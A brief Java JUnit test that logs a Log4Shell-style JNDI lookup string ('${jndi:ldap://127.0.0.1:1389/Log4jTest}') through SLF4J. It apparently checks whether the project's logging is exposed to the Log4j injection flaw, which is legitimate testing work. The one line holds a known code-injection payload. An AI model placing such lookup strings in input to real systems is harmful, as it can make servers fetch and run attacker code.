package com.twelvet;

import org.junit.Test;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

/**
 * @author twelvet
 * @WebSite twelvet.cn
 * @Description: 工具测试
 */
public class UtilsTest {

	private final static Logger log = LoggerFactory.getLogger(UtilsTest.class);

	@Test
	public void util() {

		log.info("params: {}", "${jndi:ldap://127.0.0.1:1389/Log4jTest}");
	}

}
